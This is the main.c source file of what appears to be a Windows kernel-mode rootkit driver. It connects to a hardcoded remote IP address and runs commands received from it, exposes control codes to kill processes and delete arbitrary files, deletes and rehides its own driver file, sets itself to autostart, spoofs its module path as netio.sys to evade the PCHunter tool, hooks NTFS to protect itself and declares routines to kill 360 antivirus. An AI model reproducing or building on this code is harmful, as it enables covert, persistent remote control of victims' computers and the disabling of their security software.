/*
LRM Kernel Mode Driver Part

Module: main.c

Description: Driver Entry

Author: lolita



MINI DOCUMENT

VOID InitializeObjectAttributes(
[out] POBJECT_ATTRIBUTES InitializedAttributes,
[in] PUNICODE_STRING ObjectName,
[in] ULONG Attributes,
[in] HANDLE RootDirectory,
[in, optional] PSECURITY_DESCRIPTOR SecurityDescriptor
);


*/



#pragma warning(disable:6066)
#include "internal.h"
#include "system.h"
#include "network.h"
#include "xlog.h"
//#include "tcphook.h"
#include "config.h"
#include "command.h"
#include "ntfshook.h"

PDEVICE_OBJECT g_pCtrlDO = NULL;
PKTHREAD g_pnThread;
PKTHREAD g_mnThread;
//This value should be use in the system thread only
HANDLE die = FALSE;
PWSK_SOCKET pSocket = NULL;
DWORD bSocketLocked = FALSE;
DWORD bSocketClosed = TRUE;
DWORD timeoutCounter = 0;
HANDLE hSelfFile;
HANDLE hNtosKrnl;
//bypass pchunter kernel driver check
PUNICODE_STRING pusDriverPath = NULL;
PVOID g_oldBuffer;
USHORT g_oldLength;
USHORT g_oldMaxLength;
//ntfs hook prepare
PUNICODE_STRING protectFileName;
PUNICODE_STRING prepareFileName;
PFILE_OBJECT pProtectFileObject;
PFILE_OBJECT pPrepareFileObject;
UNICODE_STRING x2protectFileName;
UNICODE_STRING x2prepareFileName;



CHAR xKill1(DWORD32 dwPid);
CHAR xDel1(PCSTR path);
CHAR xKill2(DWORD32 dwPid);
NTSTATUS DelDriverFile(PUNICODE_STRING pUsDriverPath);
void kill360();
NTSTATUS kill360_64();
NTSTATUS xDelFile3(PCHAR pAsFileName);
void DriverUnload(PDRIVER_OBJECT pDriverObject) {
	xLog("DriverUnload Called");

	



	die = TRUE;
	//stop the system thread
	if (pSocket != NULL && !bSocketLocked && !bSocketClosed){
		InterlockedExchange(&bSocketClosed, TRUE);
		CloseSocket(pSocket);
	}
	UNICODE_STRING usSymbolName;
	RtlInitUnicodeString(&usSymbolName, SYMBOLIC_NAME);

	IoDeleteSymbolicLink(&usSymbolName);
	if (g_pCtrlDO) {
		IoDeleteDevice(g_pCtrlDO);
		g_pCtrlDO = NULL;
	}
	
	freeWsk();
	
	//stop system thread
	//set a event?
	KeWaitForSingleObject(g_mnThread, Executive, KernelMode, FALSE, 0);
	KeWaitForSingleObject(g_pnThread, Executive, KernelMode, FALSE, 0);
	ObDereferenceObject(g_pnThread);
	ObDereferenceObject(g_mnThread);

	//unhook ntfs
	unhookntfs();
	LARGE_INTEGER timeout2;
	timeout2.QuadPart = -10 * 1000 * 1;
	timeout2.QuadPart *= 1; // 0.001s
	while (pendingOperation != 0) {
		KeDelayExecutionThread(KernelMode, FALSE, &timeout2);
	}

	ZwClose(hNtosKrnl);
	//ObDereferenceObject(pPrepareFileObject);
	//ObDereferenceObject(pProtectFileObject);
	ExFreePool(x2prepareFileName.Buffer);
	ExFreePool(x2protectFileName.Buffer);

	xLog("All Released, Closing Log File");
	//close log file
	//UnhookTCP();
	CloseLogFile();
	//restore pchunter bypass

	pusDriverPath->Buffer = g_oldBuffer;
	pusDriverPath->Length = g_oldLength;
	pusDriverPath->MaximumLength = g_oldMaxLength;
	
}

NTSTATUS CCDispatch(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
	xLog("CC Called");
	NTSTATUS status = STATUS_SUCCESS;
	pIrp->IoStatus.Status = status;
	pIrp->IoStatus.Information = 0;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return status;
}

NTSTATUS DeviceControlDispatch(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
	NTSTATUS status = STATUS_INVALID_PARAMETER;
	ULONG uOpSize = 0;
	
	if (pDeviceObject == g_pCtrlDO) {
		PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(pIrp);
		if (stack->MajorFunction == IRP_MJ_DEVICE_CONTROL) {
			//process it
			ULONG ctrlCode = stack->Parameters.DeviceIoControl.IoControlCode;
			//goto IRPCOMPLETE;
			//TEST
			if (ctrlCode == CC_TEST) {
				xLog("DC CC_TEST");
				//pid DWORD
				PVOID pBuffer = pIrp->AssociatedIrp.SystemBuffer;
				ULONG lInLen = stack->Parameters.DeviceIoControl.InputBufferLength;
				
				ULONG lOutLen = stack->Parameters.DeviceIoControl.OutputBufferLength;
				if (lInLen != sizeof(DWORD32)) {
					status = STATUS_INVALID_PARAMETER;
					//uOpSize = 0;
					goto IRPCOMPLETE;
				}
				//test code
				if (lOutLen != sizeof(DWORD32)) {
					status = STATUS_INVALID_PARAMETER;
					//uOpSize = 0;
					goto IRPCOMPLETE;
				}
				uOpSize = lOutLen;//too lazy to copy
				status = STATUS_SUCCESS;
			}
			else if (ctrlCode == CC_KILL1) {
				xLog("DC CC_KILL1");
				//pid DWORD
				PVOID pBuffer = pIrp->AssociatedIrp.SystemBuffer;
				ULONG lInLen = stack->Parameters.DeviceIoControl.InputBufferLength;

				ULONG lOutLen = stack->Parameters.DeviceIoControl.OutputBufferLength;
				if (lInLen != sizeof(DWORD32)) {
					status = STATUS_INVALID_PARAMETER;
					//uOpSize = 0;
					goto IRPCOMPLETE;
				}
				//test code
				if (lOutLen != sizeof(CHAR)) {
					status = STATUS_INVALID_PARAMETER;
					uOpSize = 0;
					goto IRPCOMPLETE;
				}

				DWORD32 dwPid = *((DWORD32 *)pBuffer);
				*((PCHAR)pBuffer) = xKill1(dwPid);
				
				uOpSize = sizeof(CHAR);
				status = STATUS_SUCCESS;
			}
			else if (ctrlCode == CC_KILL2) {
				xLog("DC CC_KILL2");
				//pid DWORD
				PVOID pBuffer = pIrp->AssociatedIrp.SystemBuffer;
				ULONG lInLen = stack->Parameters.DeviceIoControl.InputBufferLength;

				ULONG lOutLen = stack->Parameters.DeviceIoControl.OutputBufferLength;
				if (lInLen != sizeof(DWORD32)) {
					status = STATUS_INVALID_PARAMETER;
					//uOpSize = 0;
					goto IRPCOMPLETE;
				}
				//test code
				if (lOutLen != sizeof(CHAR)) {
					status = STATUS_INVALID_PARAMETER;
					uOpSize = 0;
					goto IRPCOMPLETE;
				}

				DWORD32 dwPid = *((DWORD32*)pBuffer);
				*((PCHAR)pBuffer) = xKill2(dwPid);

				uOpSize = sizeof(CHAR);
				status = STATUS_SUCCESS;
			}
			else if (ctrlCode == CC_DEL)
			{
				xLog("Default Delete Called");
				PSTR inStr = (PSTR)pIrp->AssociatedIrp.SystemBuffer;
				ULONG inLen = stack->Parameters.DeviceIoControl.InputBufferLength;
				inStr[inLen - 1] = 0;
				if (inLen > 700) {
					goto IRPCOMPLETE;
				}
				//PSTR kStr = ExAllocatePool2(POOL_FLAG_NON_PAGED, inLen + 16, 'loli');
				//RtlStringCbPrintfA(kStr, inLen + 16, "\\??\\%s", inStr);

				xDel1(inStr);
				//ExFreePoolWithTag(kStr, 'loli');
				status = STATUS_SUCCESS;

			}
			else if (ctrlCode == CC_DEL2)
			{
				xLog("Delete 2 Called");
				PSTR inStr = (PSTR)pIrp->AssociatedIrp.SystemBuffer;
				ULONG inLen = stack->Parameters.DeviceIoControl.InputBufferLength;
				inStr[inLen - 1] = 0;
				if (inLen > 700) {
					goto IRPCOMPLETE;
				}
				//ExAllocatePoolWithTag
				PSTR kStr = ExAllocatePoolWithTag(NonPagedPool, inLen + 16, 'loli');
				if (kStr == NULL) {
					goto IRPCOMPLETE;
				}
				RtlStringCbPrintfA(kStr, inLen + 16, "\\??\\%s", inStr);
				xDelFile3(kStr);
				ExFreePoolWithTag(kStr, 'loli');
				status = STATUS_SUCCESS;

			}
			//next code
			//pending test
		}
	}
	
	IRPCOMPLETE:

	pIrp->IoStatus.Status = status;
	pIrp->IoStatus.Information = uOpSize;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return status;
}






NTSTATUS systemThreadProc() {
	if (FALSE) {
		LARGE_INTEGER timeout;
		timeout.QuadPart = -10 * 1000 * 1000;
		timeout.QuadPart *= 15;
		KeDelayExecutionThread(KernelMode, FALSE, &timeout);
	}
	PCHAR msg = (PCHAR)ExAllocatePoolWithTag(
		NonPagedPool,
		NETBUFF_LENGTH,
		'netb'
	);
	if (msg == NULL) {
		//fuck
		xLog("6");
		return *((PNTSTATUS)(NULL));
	}
	xLog("System Thread Started");
	
	//try to connect to 47.243.50.89
	//init
	SOCKADDR_IN remoteAddr = { 0 };
	
	remoteAddr.sin_addr.S_un.S_un_b.s_b1 = 47;
	remoteAddr.sin_addr.S_un.S_un_b.s_b2 = 243;
	remoteAddr.sin_addr.S_un.S_un_b.s_b3 = 50;
	remoteAddr.sin_addr.S_un.S_un_b.s_b4 = 89;
	remoteAddr.sin_port = RtlUshortByteSwap(8777);
	remoteAddr.sin_family = AF_INET;

	//The values the handler will return
	CHAR dwNeedReply = FALSE;
	/**********************************************/
	//Here is the primary part of the loop
	//connect
CONNECT_SOCKET:
	//First Check if the driver is died, if died, stop the thread
	if (die) {
		goto HALT_THREAD;
	}

	//Then, try to connect to the server, if connect failed, goto thread_failed to check whether need to reconnect
	InterlockedExchange(&bSocketLocked, TRUE);
	NTSTATUS status = ConnectWsk(&pSocket, (PSOCKADDR)&remoteAddr);
	
	InterlockedExchange(&bSocketLocked, FALSE);
	if (!NT_SUCCESS(status)) {
		xLog("Connect Failed");
		RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "status code: %p", status);
		xLog(msg);
		goto THREAD_FAILED;
	}
	InterlockedExchange(&bSocketClosed, FALSE);
	//Send 2 hello message to the server, if failed, close socket and wait for reconnect or die
	RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "lolita winsock kernel message: %p\n", pSocket);
	status = SendWsk(pSocket, msg, strlen(msg));
	if (!NT_SUCCESS(status)) {
		xLog("Send Failed");
		RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "status code: %p", status);
		xLog(msg);
		goto CLOSE_SOCKET;
	}
	//send2
	RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "ExAllocatePool2 return: %p\n", msg);
	//send back the msg to the server
SEND_BACK:
	//any error will goto close and wait
	status = SendWsk(pSocket, msg, strlen(msg));
	if (!NT_SUCCESS(status)) {
		xLog("Send Failed");
		RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "status code: %p", status);
		xLog(msg);
		goto CLOSE_SOCKET;
	}

RECV_LOOP:
	//Recieve command from the server, if failed, go to close and die
	ULONG recvBytes = 0;
	memset(msg, 0, NETBUFF_LENGTH);
	status = RecvWsk(pSocket, msg, NETBUFF_LENGTH, &recvBytes);
	if (!NT_SUCCESS(status)) {
		xLog("Recv Failed");
		RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "status code: %p", status);
		xLog(msg);
		goto CLOSE_SOCKET;
	}
	InterlockedExchange(&timeoutCounter, 0);
	if (recvBytes < NETBUFF_LENGTH) {
		msg[recvBytes] = 0;
		xLog("stage debug ok");
	}
	else
	{
		msg[NETBUFF_LENGTH - 100] = 0;
		//recvBytes = strlen(msg);
	}
	
	xLog("recv the following content");
	xLog(msg);
	HandleServerPacket(msg, &dwNeedReply);
	if (die) {
		goto CLOSE_SOCKET;
	}
	if (dwNeedReply) {
		dwNeedReply = FALSE;
		xLog("need reply, content:");
		xLog(msg);
		goto SEND_BACK;
	}
	else {
		xLog("not need to reply");
		goto RECV_LOOP;

	}
	
	//RtlStringCbPrintfA(msg, 1024, "recvBytes: %lu", recvBytes);
	//xLog(msg);



	//close the socket
CLOSE_SOCKET:
	if (!bSocketClosed) {
		InterlockedExchange(&bSocketClosed, TRUE);
		status = CloseSocket(pSocket);
		if (!NT_SUCCESS(status)) {
			xLog("Close Failed");
			RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "status code: %p", status);
			xLog(msg);
			//ExFreePoolWithTag(msg, 'netb');
			//PsTerminateSystemThread(STATUS_SUCCESS);
			//return STATUS_SUCCESS;
		}
	}

THREAD_FAILED:
	//sleep 5s
	LARGE_INTEGER timeout2;
	timeout2.QuadPart = -10 * 1000 * 1000;
	timeout2.QuadPart *= 1;
	for (int i = 0; i < 5; i++) {
		if (die) {
			goto HALT_THREAD;
		}
		KeDelayExecutionThread(KernelMode, FALSE, &timeout2);
	}
	if (die) {
		goto HALT_THREAD;
	}
	goto CONNECT_SOCKET;

HALT_THREAD:

	
	ExFreePoolWithTag(msg, 'netb');
	PsTerminateSystemThread(STATUS_SUCCESS);
	return STATUS_SUCCESS;
}

NTSTATUS monitorThreadProc() {

	xLog("Monitor thread started");
	LARGE_INTEGER timeout2;
	timeout2.QuadPart = -10 * 1000 * 1000;
	timeout2.QuadPart *= 2;
	while (TRUE) {
		if (die) {
			break;
		}
		if (timeoutCounter >= 30) {
			if (pSocket != NULL && !bSocketLocked && !bSocketClosed) {
				InterlockedExchange(&bSocketClosed, TRUE);
				CloseSocket(pSocket);
			}
			InterlockedExchange(&timeoutCounter, 0);
		}
		InterlockedAdd(&timeoutCounter, 1);
		KeDelayExecutionThread(KernelMode, FALSE, &timeout2);
	}
	PsTerminateSystemThread(STATUS_SUCCESS);
	return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath) {
	//return STATUS_SUCCESS;
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	//create devices
	//return STATUS_SUCCESS;
	//xLog(NULL);
	InitLogFile();
	xLog("DriverEntryCalled");
	UNICODE_STRING usDeviceName;
	UNICODE_STRING usSymbolName;
	//return STATUS_SUCCESS;
	RtlInitUnicodeString(&usDeviceName, DEVICE_NAME);

	status = IoCreateDevice(pDriverObject, 0, &usDeviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &g_pCtrlDO);
	if (!NT_SUCCESS(status)) {
		DbgPrint("Device create failed?????? Unscience");
		CloseLogFile();
		//return STATUS_SUCCESS;
		return status;
	}
	g_pCtrlDO->Flags |= DO_BUFFERED_IO;
	RtlInitUnicodeString(&usSymbolName, SYMBOLIC_NAME);

	status = IoCreateSymbolicLink(&usSymbolName, &usDeviceName);
	if (!NT_SUCCESS(status)) {
		DbgPrint("Failed to create symboliclink");
		IoDeleteDevice(g_pCtrlDO);
		g_pCtrlDO = NULL;
		CloseLogFile();
		//return STATUS_SUCCESS;
		return status;
	}

	pDriverObject->MajorFunction[IRP_MJ_CREATE] = CCDispatch;
	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = CCDispatch;
	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControlDispatch;
	if (!PRODUCT_MODE) {
		pDriverObject->DriverUnload = DriverUnload;
	}
	//driver init finished
	//init log file
	//return STATUS_SUCCESS;

	
	//*******************************************************



	//*******************************************************
	//protect self
	pusDriverPath = &((PKLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection)->FullDllName;
	
	//pDriverObject->DriverSection
	
	//Read Self
	LARGE_INTEGER timeout2;
	timeout2.QuadPart = -10 * 1000 * 1000;
	timeout2.QuadPart *= 2;
	//KeDelayExecutionThread(KernelMode, FALSE, &timeout2);
	//return STATUS_SUCCESS;
	OBJECT_ATTRIBUTES objself;
	//UNICODE_STRING logPath;
	IO_STATUS_BLOCK ios;
	//RtlInitUnicodeString(&logPath, DRIVER_LOG_FILENAME);

	//protect ntoskrnl open it reference it
	UNICODE_STRING ntoskrnlName;
	RtlInitUnicodeString(&ntoskrnlName, PROTECTED_PATH_R);
	InitializeObjectAttributes(&objself, &ntoskrnlName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

	status = IoCreateFileEx(&hNtosKrnl,
		GENERIC_READ,
		&objself,
		&ios,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ,
		FILE_OPEN,
		FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		0,
		CreateFileTypeNone,
		NULL,
		IO_NO_PARAMETER_CHECKING,
		NULL
	);
	if (!NT_SUCCESS(status)) {
		xLog("open ntoskrnl failed");
		return STATUS_SUCCESS;
	}
	status = ObReferenceObjectByHandle(
		hNtosKrnl,
		FILE_READ_ACCESS,
		*IoFileObjectType,
		KernelMode,
		&pPrepareFileObject,
		NULL

	);
	if (!NT_SUCCESS(status)) {
		xLog("reference ntoskrnl failed");
		return STATUS_SUCCESS;
	}
	prepareFileName = &pPrepareFileObject->FileName;
	x2prepareFileName.Length = prepareFileName->Length;
	x2prepareFileName.MaximumLength = prepareFileName->MaximumLength;
	x2prepareFileName.Buffer = ExAllocatePool(NonPagedPool, x2prepareFileName.MaximumLength);
	memcpy(x2prepareFileName.Buffer, prepareFileName->Buffer, x2prepareFileName.MaximumLength);
	ObDereferenceObject(pPrepareFileObject);




	InitializeObjectAttributes(&objself, pusDriverPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	PVOID selfContent = NULL;
	ULONG selfSize = 0;
	status = IoCreateFileEx(&hSelfFile,
		GENERIC_READ,
		&objself,
		&ios,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		NULL,
		FILE_OPEN,
		FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		0,
		CreateFileTypeNone,
		NULL,
		IO_NO_PARAMETER_CHECKING,
		NULL);
	
	if (!NT_SUCCESS(status)) {
		xLog("open self failed");
	}
	else
	{
		FILE_STANDARD_INFORMATION fsi;
		//try read self
		status = ZwQueryInformationFile(
			hSelfFile,
			&ios,
			&fsi,
			sizeof(fsi),
			FileStandardInformation

		);
		if (!NT_SUCCESS(status)) {
			xLog("query self info failed");
			ZwClose(hSelfFile);
			goto ENTRY_DEL_SELF;
		}
		selfSize = fsi.EndOfFile.QuadPart;
		selfContent = ExAllocatePoolWithTag(NonPagedPool, selfSize, 'self');
		status = ZwReadFile(
			hSelfFile,
			NULL,
			NULL,
			NULL,
			&ios,
			selfContent,
			selfSize,
			NULL,
			NULL
		);
		if (!NT_SUCCESS(status)) {
			xLog("read self failed");
		}
		ZwClose(hSelfFile);
	}
	
	//Delete Self
	ENTRY_DEL_SELF:
	DelDriverFile(pusDriverPath);
	xLogW(pRegistryPath);
	//return STATUS_SUCCESS;
	//CloseLogFile();
	//PKEY_VALUE_PARTIAL_INFORMATION pKvi = (PKEY_VALUE_PARTIAL_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, 400, 'lreg');
	//UNICODE_STRING uniV;
	//RtlInitUnicodeString(&uniV, L"ImagePath");
	//status = queryRegW(pRegistryPath, &uniV, pKvi, 400);
	//if (NT_SUCCESS(status)) {
	//	xLogL(pKvi->Data, pKvi->DataLength);
	//	
	//}
	//else
	//{
	//	RtlStringCbPrintfA(pKvi, 400, "Reg read Error: 0x%p", status);
	//	xLog(pKvi);
	//}
	//ExFreePoolWithTag(pKvi, 'lreg');

	UNICODE_STRING uniHidPath;
	RtlInitUnicodeString(&uniHidPath, HIDDEN_PATH);
	UNICODE_STRING uniV;
	
	RtlInitUnicodeString(&uniV, L"Start");
	DWORD dw2 = 2;
	if (PRODUCT_MODE) {

		status = setRegW(pRegistryPath, &uniV, REG_DWORD, &dw2, sizeof(dw2));
	}
	RtlInitUnicodeString(&uniV, L"ImagePath");
	RtlStringCbLengthW(HIDDEN_PATH, 1000, &dw2);
	status = setRegW(pRegistryPath, &uniV, REG_SZ, HIDDEN_PATH, sizeof(HIDDEN_PATH));

	
	if (!NT_SUCCESS(status)) {
		xLog("failed to set reg image path");
	}
	else
	{
		if (selfContent != NULL) {
			xLog("ready to write new self");
			InitializeObjectAttributes(&objself, &uniHidPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
			status = IoCreateFile(&hSelfFile,
				FILE_ALL_ACCESS,
				&objself,
				&ios,
				0,
				FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN,
				NULL,
				FILE_OPEN_IF,
				FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
				NULL,
				0,
				CreateFileTypeNone,
				NULL,
				0
			);
			if (!NT_SUCCESS(status)) {
				xLog("reopen self write failed");
			}
			else
			{
				//reference it
				ObReferenceObjectByHandle(hSelfFile,
					FILE_ALL_ACCESS,
					*IoFileObjectType,
					KernelMode,
					&pProtectFileObject,
					NULL
				);
				protectFileName = &pProtectFileObject->FileName;
				x2protectFileName.Length = protectFileName->Length;
				x2protectFileName.MaximumLength = protectFileName->MaximumLength;
				x2protectFileName.Buffer = ExAllocatePool(NonPagedPool, x2protectFileName.MaximumLength);
				memcpy(x2protectFileName.Buffer, protectFileName->Buffer, x2protectFileName.MaximumLength);
				ObDereferenceObject(pProtectFileObject);

				status = ZwWriteFile(
					hSelfFile,
					NULL,
					NULL,
					NULL,
					&ios,
					selfContent,
					selfSize,
					NULL,
					NULL
				);
				if (!NT_SUCCESS(status)) {
					xLog("rewrite self failed");
				}
				xLog("rewrite successfully");
				ZwClose(hSelfFile);
				if (PRODUCT_MODE) {
					status = IoCreateFile(&hSelfFile,
						FILE_ALL_ACCESS,
						&objself,
						&ios,
						0,
						FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN,
						NULL,
						FILE_OPEN_IF,
						FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
						NULL,
						0,
						CreateFileTypeNone,
						NULL,
						0
					);
					if (!NT_SUCCESS(status)) {
						xLog("protect self failed");
					}
					else
					{
						xLog("protect self success");

					}
				}
				
				
			}
		}
	}
	if (selfContent != NULL) {
		ExFreePoolWithTag(selfContent, 'self');
	}
	//Bypass PCHUNTER
	//RtlInitUnicodeString(&g_drvPath, L"C:\\Windows\\System32\\DRIVERS\\netio.sys");
	//g_pOldPath = &((PKLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection)->FullDllName;
	g_oldBuffer = pusDriverPath->Buffer;
	g_oldLength = pusDriverPath->Length;
	g_oldMaxLength = pusDriverPath->MaximumLength;
	RtlInitUnicodeString(pusDriverPath, L"C:\\Windows\\System32\\DRIVERS\\netio.sys");

	hookNtfs(&x2protectFileName, &x2prepareFileName);

	CLIENT_ID       clientId = { 0 };
	initWsk();
	//******************************************************************Put Your Test Here






	//create network system thread
	xLog("Creating System Thread");
	HANDLE hSysThread = NULL;
	PsCreateSystemThread(
		&hSysThread,
		NULL,
		NULL,
		NtCurrentProcess(),
		&clientId,
		systemThreadProc,
		NULL
	);
	//get network systh thread object
	
	ObReferenceObjectByHandle(
		hSysThread,
		THREAD_ALL_ACCESS,
		NULL,
		KernelMode,
		&g_pnThread,
		NULL
	);
	ZwClose(hSysThread);

	//start a monitor thread, to kill the primary thread
	PsCreateSystemThread(
		&hSysThread,
		NULL,
		NULL,
		NtCurrentProcess(),
		&clientId,
		monitorThreadProc,
		NULL
	);
	//get network systh thread object

	ObReferenceObjectByHandle(
		hSysThread,
		THREAD_ALL_ACCESS,
		NULL,
		KernelMode,
		&g_mnThread,
		NULL
	);
	ZwClose(hSysThread);

	xLog("DriverEntry Finished");
	//InstallHook();
	//return STATUS_SUCCESS;
	return status;
	
}















/*
void TryUnlockFile(PFILE_OBJECT FileObject)
{
	SYSTEM_HANDLE_INFORMATION HandleInformation1;
	ULONG RetLen = 0;
	PVOID Buffer;
	ZwQuerySystemInformation(SystemHandleInformation, &HandleInformation1, sizeof(HandleInformation1), &RetLen);
	if (RetLen)
	{
		POBJECT_NAME_INFORMATION ObjectNameInfo1 = (POBJECT_NAME_INFORMATION)ExAllocatePool(NonPagedPool, 2056);
		POBJECT_NAME_INFORMATION ObjectNameInfo2 = (POBJECT_NAME_INFORMATION)ExAllocatePool(NonPagedPool, 2056);
		ObjectNameInfo1->Name.Length = 2048;
		ObjectNameInfo2->Name.Length = 2048;
		Buffer = ExAllocatePool(PagedPool, RetLen + 4096);

		status = ObQueryNameString(FileObject, ObjectNameInfo2, ObjectNameInfo2->Name.Length, &RetLen);
		if (NT_SUCCESS(status) && Buffer && ObjectNameInfo1)
		{
			status = ZwQuerySystemInformation(SystemHandleInformation, Buffer, RetLen + 4096, &RetLen);
			if (NT_SUCCESS(status))
			{
				UCHAR ObjectTypeIndex = 0;
				PSYSTEM_HANDLE_INFORMATION HandleInformation2 = (PSYSTEM_HANDLE_INFORMATION)Buffer;
				for (int i = 0; i < HandleInformation2->NumberOfHandles; i++)
				{
					if (HandleInformation2->Handles[i].Object == FileObject)
					{
						ObjectTypeIndex = HandleInformation2->Handles[i].ObjectTypeIndex;
						Break;
					}
				}
				if (ObjectTypeIndex)
				{
					for (int i = 0; i < HandleInformation2->NumberOfHandles; i++)
					{
						if (HandleInformation2->Handles[i].ObjectTypeIndex == ObjectTypeIndex)
						{
							CLIENT_ID ClientId;
							HANDLE TargetProcessHandle = NULL;
							HANDLE CurrentProcessHandle = NULL;
							HANDLE TargetHandle = NULL;
							PVOID TargetFileObject = NULL;
							OBJECT_ATTRIBUTES oa;
							ULONG RetLen;
							InitializeObjectAttributes(&oa, NULL, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
							ClientId.UniqueProcess = HandleInformation2->Handles[i].UniqueProcessId;
							ClientId.UniqueThread = 0;
							status = ZwOpenProcess(&CurrentProcessHandle, PROCESS_ALL_ACCESS, &oa, &ClientId);
							if (NT_SUCCESS(status))
							{
								InitializeObjectAttributes(&oa, NULL, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
								ClientId.UniqueProcess = PsGetCurrentProcessId();
								ClientId.UniqueThread = 0;
								status = ZwOpenProcess(&TargetProcessHandle, PROCESS_ALL_ACCESS, &oa, &ClientId);
								if (NT_SUCCESS(status))
								{//从引用到该对象的进程复制一份句柄到当前进程
									status = ZwDuplicateObject(CurrentProcessHandle, HandleInformation2->Handles[i].HandleValue, TargetProcessHandle, &TargetHandle, 0, 0, DUPLICATE_SAME_ACCESS);
									if (NT_SUCCESS(status) && TargetHandle)
									{
										status = ObReferenceObjectByHandle(TargetHandle, GENERIC_READ, IoFileObjectType, 0, &TargetFileObject, 0);
										if (NT_SUCCESS(status) && MmIsAddressValid(TargetFileObject) && TargetFileObject->DeviceObject->DeviceType == FILE_DEVICE_DISK)
										{
											status = ObQueryNameString(TargetFileObject, ObjectNameInfo1, ObjectNameInfo1->Name.Length, &RetLen);
											if (NT_SUCCESS(status))
											{
												__try
												{
													if (RtlEqualUnicodeString(ObjectNameInfo1, ObjectNameInfo2, TRUE))
													{
														PEPROCESS Process = NULL;
														KAPC_STATE ApcState;
														HANDLE ProcessId = HandleInformation2->Handles[i].UniqueProcessId;
														HANDLE ObjectHandle = HandleInformation2->Handles[i].HandleValue;
														OBJECT_HANDLE_FLAG_INFORMATION Ohfi;
														if (ProcessId != 0 && ProcessId != 4 && ProcessId != 8)
														{
															status = PsLookupProcessByProcessId(ProcessId, &Process);
															if (NT_SUCCESS(status))
															{
																KeStackAttachProcess(Process, &ApcState);
																CmpSetHandleProtection(&Ohfi, FALSE);
																ZwClose(ObjectHandle);
																KeUnstackDetachProcess(&ApcState);
																if (Process)
																{
																	ObDereferenceObject(Process);
																	Process = NULL;
																}
															}
														}
													}
													else
													{
														HANDLE ThreadHandle = DecodeKernelHandle(HandleInformation2->Handles[i].HandleValue);
														PsCreateSystemThread(&ThreadHandle, THREAD_ALL_ACCESS, NULL, NULL, NULL, UnlockFileThread, ThreadHandle);
														ZwWaitForSingleObject(ThreadHandle, FALSE, NULL);
														ZwClose(ThreadHandle);
													}
												}
												__finally
												{
												}
											}
										}
									}
								}
							}


							if (TargetProcessHandle)
							{
								ZwClose(TargetProcessHandle);
								TargetProcessHandle = 0;
							}
							if (CurrentProcessHandle)
							{
								ZwClose(CurrentProcessHandle);
								CurrentProcessHandle = 0;
							}
							if (TargetHandle)
							{
								ZwClose(TargetHandle);
								TargetHandle = 0;
							}
							if (TargetFileObject)
							{
								ObfDereferenceObject(TargetFileObject);
								TargetFileObject = 0;
							}
						}
					}
				}
			}
		}
		if (Buffer)
			ExFreePool(Buffer);
		if (ObjectNameInfo1)
			ExFreePool(ObjectNameInfo1);
		if (ObjectNameInfo2)
			ExFreePool(ObjectNameInfo2);
	}
}*/